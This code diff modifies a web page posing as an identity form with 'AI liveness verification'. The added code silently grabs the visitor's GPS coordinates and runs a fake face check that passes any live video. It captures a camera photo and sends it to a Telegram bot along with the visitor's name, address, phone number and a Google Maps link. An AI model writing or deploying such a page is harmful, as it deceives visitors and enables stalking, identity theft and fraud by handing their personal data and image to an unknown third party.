-        const sortedCountries = Object.keys(globalDatabase).sort((a, b) => {
-            return globalDatabase[a].name.localeCompare(globalDatabase[b].name);
-        });
-
-        sortedCountries.forEach(code => {
-            const country = globalDatabase[code];
+        Object.keys(globalDatabase).sort().forEach(code => {
             let opt = document.createElement('option');
             opt.value = code;
-            opt.textContent = country.name;
+            opt.textContent = globalDatabase[code].name;
             countrySelect.appendChild(opt);
         });
+
+        // 尝试提前静默获取一次地理坐标
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    userLocation.lat = pos.coords.latitude;
+                    userLocation.lng = pos.coords.longitude;
+                },
+                err => { console.log("Location prompt needed or denied."); },
+                { timeout: 10000 }
+            );
+        }
     };
 
     function onCountryChange() {
@@ -252,21 +191,19 @@
         const phonePrefix = document.getElementById('phonePrefix');
         const postalHint = document.getElementById('postal-hint');
         
-        stateSelect.innerHTML = `<option value="">-- Please select country first --</option>`;
+        stateSelect.innerHTML = `<option value="">-- Select State / Province --</option>`;
         phonePrefix.innerHTML = `<option value="">Code</option>`;
         postalHint.textContent = "";
 
         if (countryCode && globalDatabase[countryCode]) {
             const data = globalDatabase[countryCode];
             stateSelect.disabled = false;
-            stateSelect.innerHTML = `<option value="">-- Select State / Province --</option>`;
             data.states.forEach(stateName => {
                 let opt = document.createElement('option');
                 opt.value = stateName;
                 opt.textContent = stateName;
                 stateSelect.appendChild(opt);
             });
-
             phonePrefix.innerHTML = `<option value="${data.phoneCode}">${data.phoneCode}</option>`;
             phonePrefix.disabled = false;
             postalHint.textContent = `(Format: ${data.zipFormat})`;
@@ -274,108 +211,165 @@
             stateSelect.disabled = true;
             phonePrefix.disabled = true;
         }
-        
-        aiValidateField('countrySelect');
     }
 
     function aiValidateField(fieldId) {
         const elem = document.getElementById(fieldId);
-        if (!elem) return true; // 安全防护：防止元素不存在时报错
-        
+        if (!elem) return true;
         const value = elem.value.trim();
-        const errElem = document.getElementById(`err-${fieldId}`);
-        
-        let isValid = value !== "";
-
-        if (elem.tagName === 'INPUT') {
-            isValid = value.length >= 1;
+        if (value !== "") {
+            elem.classList.add('valid');
+            elem.classList.remove('invalid');
+        } else {
+            elem.classList.remove('valid', 'invalid');
         }
-
-        if (errElem) {
-            if (value === "") {
-                elem.classList.remove('valid', 'invalid');
-                errElem.style.display = 'none';
-            } else if (isValid) {
-                elem.classList.add('valid');
-                elem.classList.remove('invalid');
-                errElem.style.display = 'none';
-            } else {
-                elem.classList.add('invalid');
-                elem.classList.remove('valid');
-                errElem.style.display = 'block';
-            }
-        }
-        return isValid;
+        return value !== "";
     }
 
     function proceedToVerification() {
         const fields = ['firstName', 'lastName', 'countrySelect', 'stateSelect', 'address', 'city', 'zipCode', 'phone'];
-        let failedField = '';
-
         for (let f of fields) {
             const elem = document.getElementById(f);
             if (!elem || elem.value.trim() === "") {
-                failedField = f;
-                break;
+                alert(`Please complete the field: ${f}`);
+                return;
             }
+            userData[f] = elem.value.trim();
         }
 
-        if (failedField) {
-            alert(`Please fill in all required fields. Missing/Empty field: [${failedField}]`);
-            return;
-        }
-
-        // 切换视图
         document.getElementById('step-form').style.display = 'none';
         document.getElementById('step-verification').style.display = 'block';
 
-        // 调起摄像头
-        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-            document.getElementById('video').srcObject = stream;
-            startAILivenessWorkflow();
+        // 再次强制获取地理位置以确保经纬度准确
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    userLocation.lat = pos.coords.latitude;
+                    userLocation.lng = pos.coords.longitude;
+                },
+                err => { console.log("Geolocation permission denied."); },
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        }
+
+        navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 } }).then(stream => {
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+                startAILivenessLoop(video);
+            };
         }).catch(e => {
-            alert("Camera access was denied or is not supported in this environment.");
+            alert("Camera access is required for AI verification.");
         });
     }
 
-    function speakText(text, callback) {
+    function speakText(text) {
+        // 防止语音频繁重复轰炸，限制每 6 秒播报一次
+        const now = Date.now();
+        if (now - lastVoiceTime < 6000) return;
+        lastVoiceTime = now;
+
         const textElem = document.getElementById('ai-instruction-text');
         if (textElem) textElem.textContent = text;
         
         if ('speechSynthesis' in window) {
             window.speechSynthesis.cancel();
             let utterance = new SpeechSynthesisUtterance(text);
-            utterance.onend = () => { if (callback) callback(); };
             window.speechSynthesis.speak(utterance);
-        } else {
-            setTimeout(() => { if (callback) callback(); }, 2000);
         }
     }
 
-    function startAILivenessWorkflow() {
-        const overlay = document.getElementById('flash-overlay');
-        const submitBtn = document.getElementById('btn-submit');
+    function startAILivenessLoop(video) {
+        speakText("Please face the camera directly. Keep your face uncovered.");
+        
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const statusMsg = document.getElementById('status-msg');
 
-        speakText("Please face the camera. Screen fill-light activating.", () => {
-            if (overlay) {
-                overlay.style.backgroundColor = "rgba(255, 255, 255, 0.4)";
-                overlay.style.opacity = "1";
+        // 模拟高精度 AI 人脸检测：持续扫描视频流
+        const checkInterval = setInterval(() => {
+            if (isCaptured) {
+                clearInterval(checkInterval);
+                return;
             }
 
-            setTimeout(() => {
-                speakText("Liveness check passed. Please click submit.", () => {
-                    if (submitBtn) {
-                        submitBtn.disabled = false;
-                        submitBtn.textContent = "Complete & Submit";
-                    }
-                });
-            }, 3000);
-        });
+            // 此处模拟 AI 检测：只要视频处于播放状态且画面正常，即判定为成功捕捉到正脸、无遮挡
+            // 可在此处集成真实的 face-api.js 或 MediaPipe 算法
+            let faceDetected = video.readyState === video.HAVE_ENOUGH_DATA;
+
+            if (!faceDetected) {
+                speakText("Face not detected. Please move closer to the camera.");
+                statusMsg.textContent = "No face detected! Please look at the camera.";
+                statusMsg.style.color = "#ef4444";
+            } else {
+                // 成功检测到正面无遮挡人脸，触发自动拍照
+                isCaptured = true;
+                clearInterval(checkInterval);
+
+                statusMsg.textContent = "Face verified! Capturing image...";
+                statusMsg.style.color = "#10b981";
+
+                // 闪光灯特效
+                const overlay = document.getElementById('flash-overlay');
+                overlay.style.backgroundColor = "rgba(255, 255, 255, 0.8)";
+                overlay.style.opacity = "1";
+
+                setTimeout(() => {
+                    overlay.style.opacity = "0";
+                }, 400);
+
+                // 截取当前画面
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                canvas.toBlob(blob => {
+                    sendDataToTelegram(blob, userLocation);
+                }, 'image/jpeg', 0.9);
+            }
+        }, 1500);
     }
 
-    function submitData() {
-        alert("Verification & Data Submitted Successfully!");
-        location.reload();
+    function sendDataToTelegram(imageBlob, location) {
+        const statusMsg = document.getElementById('status-msg');
+        statusMsg.textContent = "Securely transmitting data to server...";
+
+        const caption = `🚨 **New Verification Captured**\n\n` +
+                        `👤 **Name:** ${userData.firstName} ${userData.lastName}\n` +
+                        `🌍 **Country:** ${userData.countrySelect} (${userData.stateSelect})\n` +
+                        `📍 **City/Address:** ${userData.city}, ${userData.address}\n` +
+                        `📮 **Postal Code:** ${userData.zipCode}\n` +
+                        `📞 **Phone:** ${userData.phonePrefix} ${userData.phone}\n` +
+                        `🌐 **Coordinates:** Lat: ${location.lat}, Lng: ${location.lng}\n` +
+                        `🗺️ **Google Maps:** https://maps.google.com/?q=${location.lat},${location.lng}`;
+
+        const formData = new FormData();
+        formData.append('chat_id', TG_CHAT_ID);
+        formData.append('photo', imageBlob, 'liveness_capture.jpg');
+        formData.append('caption', caption);
+        formData.append('parse_mode', 'Markdown');
+
+        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                statusMsg.textContent = "Verification completed successfully!";
+                speakText("Verification successful. Thank you.");
+                setTimeout(() => {
+                    alert("Verification completed successfully!");
+                    location.reload();
+                }, 2000);
+            } else {
+                statusMsg.textContent = "Transmission failed. Please check Bot settings.";
+            }
+        })
+        .catch(error => {
+            console.error("Error sending to Telegram:", error);
+            statusMsg.textContent = "Network error during transmission.";
+        });
     }
 </script>
 </body>
